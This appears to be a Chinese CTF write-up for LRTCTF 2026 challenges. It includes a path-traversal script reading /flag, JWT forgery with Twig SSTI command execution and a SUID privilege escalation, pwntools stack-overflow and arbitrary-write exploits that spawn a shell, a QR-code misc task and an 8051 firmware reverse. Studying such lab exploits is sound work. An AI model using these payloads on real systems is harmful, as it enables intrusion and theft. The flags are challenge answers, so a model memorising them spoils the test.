首页商品图不是写死在 img 标签里的，翻 JS 看到 `POST /load_image`，参数就一个 `filename=phone.png`——文件名直接进读取函数，不用犹豫，先试穿越。服务端逻辑（`../../app.py` 读出来确认的）是 `path = IMAGE_DIR + "/" + filename`，只拦 `/` 开头的绝对路径和 `\x00`，`..` 完全没过滤。图片目录 /app/static/images：`../app.py` 差一级 404，`../../app.py` 直接把 Flask 源码吐出来；源码里没 flag，再多跳一级 `../../../flag` 命中。

```python
# exp_lrtmall.py
import requests

URL = "http://10.3.37.51:33649/load_image"

def read(fn):
    r = requests.post(URL, data={"filename": fn}, timeout=10)
    return r.status_code, r.text

for fn in ("phone.png",           
           "../app.py",       
           "../../app.py",        
           "../../../flag"):       
    code, body = read(fn)
    print(fn, "->", code, body[:120].replace("\n", " "))
```

```
lrtctf{PatH_TrAVle_a2319008d8ad}
```

（动态 flag，换实例值会变。）

## 18. 阿巴巴巴巴⑧

Web / ⭐⭐⭐⭐，动态容器实例，flag 在 `/root/flag`。链路：弱 JWT `secret` → 伪造 admin → Twig 盲 SSTI → uploads 回显 → SUID logclean 提权。全程浏览器手工复现：

1. 首页发 `role:user` 的 JWT，`/admin/` 403 拦截：

（截图：`/admin/` 返回 403。）

2. 离线爆破 HS256 得弱密钥 `secret`，重签 `role:admin`。原 Cookie 是 HttpOnly 覆盖不掉——浏览器控制台写一条 `path=/admin` 的同名 Cookie（更长路径优先发送，PHP 取第一个），伪造身份进管理台「通知模板」：

（截图：伪造 admin 的 Cookie 后进了管理台。）

3. 「通知模板」= Twig 盲 SSTI。坑：表单 `action="/admin"` 少尾斜杠，POST 被 Apache 301 打成 GET、模板根本没送达——控制台 `document.forms[0].action='/admin/'` 修正后再提交。`{{["id > /var/www/html/uploads/id.txt 2>&1"]|map('system')}}` 落盘，打开 `/uploads/id.txt` 见 `uid=33(www-data)`，回显通道打通：

（截图：`id` 回显 `uid=33(www-data)`，RCE 通道成立。）

4. SUID `/usr/local/bin/logclean` 黑名单漏 `$()`，`${IFS}` 代替空格，两连击：cp `/root/flag` 进 uploads、再 chmod 644，浏览器直接读 `/uploads/flag.txt`：

（截图：浏览器直接打开 `/uploads/flag.txt` 拿到 flag。）

```
flag:lrtctf{96cc3418-f1cd-4bd1-98ca-bb8b1f855ba3}
```

---

# Pwn

## 13. Overstack

Pwn（栈溢出），附件 `stackstart`（ELF 64-bit，无 PIE，有 canary，NX），远程 `10.3.37.51:33686`。

菜单三档：`1) draft  2) send  3) quit`。字符串全是 XOR `0x5A` 过的，不影响打。

### 漏洞

draft（`0x401682`）：`read(0, buf, 0x7f)` 然后 **`printf(buf)`**，格式化字符串。
send（`0x401792`）：缓冲区在 `rbp-0x70`，`read(0, buf, 0x180)`，直接打穿 canary 和返回地址。

隐藏功能在 `0x4014e9`：`rdi == "COURIER!"`（`0x434F555249455221`）才 `fopen("/flag")` 打出来。程序里现成 `pop rdi; ret`：`0x4014d0`。

### 打法

同一条连接里先 draft 漏栈，找到 `0x4018c9`（draft 的返回地址），往前两格就是 canary。canary 最低字节恒为 0，三格泄漏里按这个特征自动挑，不用管它在第几格：

```python
# exp_overstack.py
from pwn import *

p = remote("10.3.37.51", 33686)
POP_RDI, RET = 0x4014d0, 0x4014d1
WIN, MAGIC  = 0x4014e9, 0x434F555249455221      

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b":", b"%29$p|%30$p|%31$p")
vals = [int(v, 16) for v in p.recvline().strip().split(b"|")]
canary = next(v for v in vals if v & 0xFF == 0) 
log.success("canary: %#x" % canary)

payload = flat({0x68: canary}, b"B" * 8, RET, POP_RDI, MAGIC, WIN)
p.sendlineafter(b"> ", b"2")
p.sendafter(b":", payload.ljust(0x180, b"\x00"))
p.interactive()
```

```
lrtctf{7328047a-d241-442e-95d5-e8f3d6414f93}
```

## 20. Tilde（Pwn · ⭐⭐⭐⭐⭐）

Pwn，附件 `tilde`（ELF 64-bit，**无 PIE，无 canary，NX**），远程 `10.3.37.51:33959`。

菜单程序：`1) expand path  2) set display name  3) greet  4) session info`。全局量：`g_users`（`root`/`ctf` 两个表项）、`g_profile`（0x404060，初始 `"anonymous"`，**+0x40 处藏了一个函数指针** 0x4040a0）、`g_path`/`g_line`（各 4096，固定地址）。`cmd_greet` 就是 `(*(g_profile+0x40))(g_profile)`。

### 漏洞：VLA 任意写

`cmd_expand` 先后读两个输入：`strtoull` 出来的 `len`（**u64 任意值**）和一行 path 存进 `g_line`（原样 `memcpy` 进 `g_path`，可以带嵌入 `\0`）。`expand_tilde(g_line, len)` 里：

```c
size_t V = ((len + 24) / 16) * 16;   // gcc VLA 对齐公式
char scratch[V - 24 + 1];            // sub rsp, V
```

`len` 完全可控 ⇒ `sub rsp, V` 可以把 rsp 落在**任意 16 对齐地址**上，scratch 不再受栈约束。随后的拷贝循环把 `g_line` 的**非 NUL 前缀**逐字节写到 scratch，循环退出后还会 `scratch[p] = 0` 自动补一个 NUL。合起来就是：**把任意非 NUL 字节串 + 结尾一个 `\0` 写到任意 16 对齐地址**（长度 ≤ 0xFFF，每条 expand 一次）。

栈地址靠 `cmd_info` 的 `[*] session frame: %p` 泄漏：`leak = main_rbp - 0x40`，而 `expand_tilde` 的 rbp = `main_rbp - 0xB0`，于是

```python
V     = (leak + 0x40 - 0xB0) - 0x50 - target
len   = V - 24          # 使 ((len+24)/16)*16 == V
```

### 打法

`cmd_setname` 最多写 `g_profile[0..0x3e]`，够不着 +0x40 的函数指针；用任意写两步走（一次 expand 一次即可，先写 `"root\0"` 做定位 oracle，输出从 `literal` 变 `expanded` 即证明偏移算对）：

1. `D = 0x404060`，payload = `b"sh #" + b" "*(0x3C) + p64(0x4010e0)[:3]`（共 0x43 字节，全非 NUL）
   → `g_profile = "sh #     ...    \xE0\x10@"`，自动补的 NUL 落在 0x4040a3
2. 0x4040a0 的函数指针高 5 字节本来就是 0，低 3 字节被改成 `e0 10 40` ⇒ **fnptr = `system@plt`**
3. 选 3 greet：`rdi = g_profile = "sh #<空格>\xE0\x10@"`，`system` 里 `sh -c` 解析成 `sh` + 注释 → 直接弹 shell

```python
# exp.py（纯 socket，本地 WSL 验证后打远程）
V  = (leak + 0x40 - 0xB0) - 0x50 - 0x404060
payload = b'sh #' + b' ' * (0x40 - 4) + (0x4010e0).to_bytes(3, 'little')
# expand(D=0x404060, payload) 后选 3 → system("sh #...") → cat /flag
```

```
lrtctf{2da5d7c5-d4e0-4b5c-af02-9a3003a4cf2c}
```

---

# Misc（续）

## 19. 问卷（Misc · ⭐☆☆☆☆）

**附件**：`4223CE3C8A828ED4F6B81EFD89249C2D.jpg`（256×256 JPEG 二维码）

### 解法

题目只给一张二维码图。注意两点坑：

1. `pyzbar` 在本机缺 `libiconv.dll` 加载不了，直接用 **OpenCV** 的 `cv2.QRCodeDetector`；
2. `cv2.imread` 不认中文路径（`D:\下载\...`），要用 `np.fromfile + cv2.imdecode` 读图。

```python
import cv2, numpy as np
buf = np.fromfile(r'D:/下载/wenjuan_work/qr.jpg', dtype=np.uint8)   # 中文路径必须走 fromfile
img = cv2.imdecode(buf, cv2.IMREAD_COLOR)
gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
txt, _, _ = cv2.QRCodeDetector().detectAndDecode(gray)
print(txt)
```

解出问卷星链接：

```
https://v.wjx.cn/vm/rXEEUTR.aspx
```

curl 拉取问卷页面（标题"LRTCTF2026决赛问卷"），**flag 就藏在问卷说明 `divDesc` 的 description 里**，不需要真填问卷：

```html
<div id="divDesc" class="formfield">
    <span class="description">
        本题答案：lrtctf{lrtctf_1s_s0_3asy!}
    </span>
</div>
```

**知识点**：二维码解码一步到位，真正的考点是"扫码 → 访问问卷 → 直接翻问卷页面源码"，flag 在问卷描述字段而非答题流程里。

## 21. 工厂零信任数仓（Reverse · ⭐⭐⭐⭐⭐ · 500pts）

**Flag：`lrtctf{49c1448ab776e6fb992d1722}`**

### 固件逆向

向量：`main`=SDCC crt（`SP=0xFA`，中断向量 0x0B/0x13/0x23）。串口收中断把字节塞进 0x0E 起的 8 字节环形缓冲；INT0/INT1 中断对 16bit LFSR 采样（种子来源）；Timer0 心跳。

核心全局区（IRAM）：`0x08`=字节计数器、`0x09:0x0C`=种子、`0x0B`=帧序号、`0x21/22/23`=帧头 cmd/seq/len、`0x33..0x42`=表A、`0x43..0x52`=挑战、`0x53..`=收包缓冲、`0x7B..0x9A`=密文仓、**`0x9B..0xAA`=演进窗口（密钥流状态）**、`0xAB..0xBA`=表AB、`0xBB..0xCA`=表BB、`0xCB..0xEA`=密钥 schedule 输出、`0xF3..0xFA`=应答计算区。

**帧格式**：`A5 5A 01 CMD SEQ LEN payload CRC16(lo,hi)`，CRC 为 poly 0x1021 自定义移位方向，覆盖 `01 cmd seq len payload`，初值 FFFF。

**核心机制（"每一次维护交互都计入密钥流演进"）**——`0x0924` 每字节演化：

```
idx = cnt & 15
win[idx] = ROL8(win[idx] ^ byte ^ cnt, (idx%5)+1)
win[(idx+1)&15] += win[idx] + 0x3D
cnt++
```

收到的每帧按 `01,cmd,seq,len,payload` 逐字节喂入（`0x0862`）。

**命令流**（会话内 seq 递增校验）：`01`=认证（16B 挑战 → 存入 0x43 表）、`02`=魔术字 `A1 52 10 07`、`03`=信息（回 `02 04 20 A5`）、`04`=读字（回 `[p0, win0^p0, win5+p0, win10^L]`，L=版本字节和 0x9E）、`05`=解锁（8B MAC 校验）。

**解锁链**（seq 必须 =7）：
1. `0x0BE5` 从 LFSR 取 **16bit 种子** → `0x09:0x0C`（未知的"存档密钥"）。
2. `0x06B2` MAC 校验：`st = 种子 ^ ROL16(win7:win0,3)`，循环 8 轮 `st += 表A[(3i+1)&15]; st += 挑战[(5i)&15]; st = ROL16(st,5)`，第 i 字节输出 = `ROL8(win[(i+9)&15] ^ st_lo, (i%7)+1)`。
3. `0x0862` 演化本帧 → `0x0227` 生成表 AB/BB：先按种子/挑战/窗口初始化，再 **48×16 轮混合**（每轮 `AB[k] = BB[k] ^ ROL8(xorAB(k+9) ^ (13*j+k+…), ((k+j)%7)+1)`，`hash = ((g*7+0x2D)^表A[g]^表A[(g+3)&15])`——第一版漏了这 768 轮，全盘错）。
4. `0x07F5` 密钥 schedule 32 轮：`ks[i] = chain ^ gf_mul(ROL8(xorAB(i+7),(i%7)+1) ^ vault[blk*8+idx], 0xF6) ^ xorAB(i)`（GF(2^8) 乘法，AES 多项式 0x11B）——**这一步就是在用会话密钥解密 EEPROM 0x50..0x6F 的密文仓**。
5. `0x03AC`/`0x0B48` 计算并核对 8 字节应答 == EEPROM `0x70..0x77`，通过后把 32 字节 ks 按 4 帧 `cmd=0x90` 发出 = **被封存的明文**。

### 破解

1. CRC/帧解析程序化，100 会话全部对齐：99 个是陷阱（挑战长度 15、错误 seq、错误魔术字……失败的解锁回 `FF`，且设备仍会吐 **等差数列的假 0x90 数据**（start=13*S，块间步进 0x1F——就是上面 13*j 因子的退化形态），纯干扰）。
2. **会话 73** 是唯一干净会话：挑战 `10203040...f000`、MAC `49a796bc3f933af7`、4×0x90 数据非等差（`a40f7c7f...`，也是障眼法）。
3. 种子只有 16bit：复刻演化+MAC 暴力枚举 0..65535，**唯一命中 `0xB35A`**（1/2^48 误报率，状态可信）。
4. 用种子+会话状态跑固件自己的解密管线。Python 复刻与 **8051 模拟器跑真固件代码逐字节一致**（`AB/BB` 完全一致，`ks` 完全一致），解出：

```
6c72746374667b3439633134343861623737366536666239393264313732327d
"lrtctf{49c1448ab776e6fb992d1722}"
```

